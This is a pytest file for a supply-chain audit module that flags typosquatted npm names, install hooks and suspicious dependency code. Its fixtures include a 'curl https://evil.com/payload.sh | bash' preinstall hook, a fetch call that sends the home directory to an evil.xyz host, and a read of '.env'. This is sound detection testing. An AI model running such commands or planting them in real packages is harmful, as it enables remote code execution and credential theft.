"""Tests for the supply chain / dependency audit module."""

import json

from webscan.models import Category, Severity
from webscan.modules.deps import DepsModule, _edit_distance


def _make_module(target="/tmp/fake-project"):
    return DepsModule({"target": target, "source_path": target})


class TestEditDistance:
    def test_identical(self):
        assert _edit_distance("lodash", "lodash") == 0

    def test_one_char_diff(self):
        assert _edit_distance("lodash", "lodas") == 1
        assert _edit_distance("lodash", "lodesh") == 1

    def test_two_char_diff(self):
        assert _edit_distance("express", "expresz") == 1
        assert _edit_distance("expres", "express") == 1

    def test_empty(self):
        assert _edit_distance("", "") == 0
        assert _edit_distance("abc", "") == 3


class TestTyposquats:
    def test_detects_typosquat(self):
        module = _make_module()
        deps = {"lodasg": {"version": "^4.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) >= 1
        assert any("typosquat" in f.title.lower() for f in findings)
        assert findings[0].severity == Severity.HIGH

    def test_exact_match_no_finding(self):
        module = _make_module()
        deps = {"lodash": {"version": "^4.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) == 0

    def test_very_different_name_no_finding(self):
        module = _make_module()
        deps = {"my-custom-lib": {"version": "^1.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) == 0

    def test_short_names_ignored(self):
        module = _make_module()
        # "ab" is too short to flag (len <= 3)
        deps = {"ab": {"version": "^1.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) == 0


class TestLifecycleScripts:
    def test_postinstall_detected(self):
        module = _make_module()
        pkg_data = {
            "name": "my-app",
            "scripts": {
                "start": "node index.js",
                "postinstall": "node scripts/setup.js",
            },
        }
        findings = module._check_lifecycle_scripts(pkg_data, "package.json")
        assert len(findings) == 1
        assert "postinstall" in findings[0].title

    def test_preinstall_detected(self):
        module = _make_module()
        pkg_data = {
            "scripts": {
                "preinstall": "curl https://evil.com/payload.sh | bash",
            },
        }
        findings = module._check_lifecycle_scripts(pkg_data, "package.json")
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM

    def test_normal_scripts_ignored(self):
        module = _make_module()
        pkg_data = {
            "scripts": {
                "start": "node index.js",
                "test": "jest",
                "build": "tsc",
            },
        }
        findings = module._check_lifecycle_scripts(pkg_data, "package.json")
        assert len(findings) == 0

    def test_no_scripts(self):
        module = _make_module()
        findings = module._check_lifecycle_scripts({"name": "my-app"}, "package.json")
        assert len(findings) == 0


class TestSuspiciousCode:
    def test_detects_env_read(self, tmp_path):
        # Create a fake node_modules structure
        pkg_dir = tmp_path / "node_modules" / "evil-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({"name": "evil-pkg"}))
        (pkg_dir / "index.js").write_text('const x = require("fs"); x.readFile(".env", cb);')

        module = _make_module()
        deps = {"evil-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert any("Reads .env" in f.title for f in findings)

    def test_detects_homedir(self, tmp_path):
        pkg_dir = tmp_path / "node_modules" / "sus-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({"name": "sus-pkg"}))
        (pkg_dir / "index.js").write_text('const h = os.homedir(); fetch("https://evil.xyz/steal?d=" + h);')

        module = _make_module()
        deps = {"sus-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert any("home directory" in f.title.lower() for f in findings)

    def test_detects_lifecycle_in_dependency(self, tmp_path):
        pkg_dir = tmp_path / "node_modules" / "hook-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({
            "name": "hook-pkg",
            "scripts": {"postinstall": "node steal.js"},
        }))

        module = _make_module()
        deps = {"hook-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert any("postinstall" in f.title for f in findings)

    def test_clean_package_no_findings(self, tmp_path):
        pkg_dir = tmp_path / "node_modules" / "clean-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({"name": "clean-pkg"}))
        (pkg_dir / "index.js").write_text('module.exports = function add(a, b) { return a + b; };')

        module = _make_module()
        deps = {"clean-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert len(findings) == 0


class TestFullExecution:
    def test_no_package_json(self, tmp_path):
        module = _make_module(str(tmp_path))
        findings = module.execute(str(tmp_path))
        assert len(findings) == 0

    def test_with_package_json(self, tmp_path):
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "test-app",
            "dependencies": {"lodash": "^4.17.21"},
            "scripts": {"postinstall": "echo done"},
        }))
        module = _make_module(str(tmp_path))
        findings = module.execute(str(tmp_path))
        # Should find at least the lifecycle script
        assert any("postinstall" in f.title.lower() for f in findings)

    def test_all_findings_have_correct_source(self, tmp_path):
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "test-app",
            "dependencies": {"lodasg": "^4.0.0"},
        }))
        module = _make_module(str(tmp_path))
        findings = module.execute(str(tmp_path))
        for f in findings:
            assert f.source == "deps"
            assert f.category == Category.DEPENDENCY
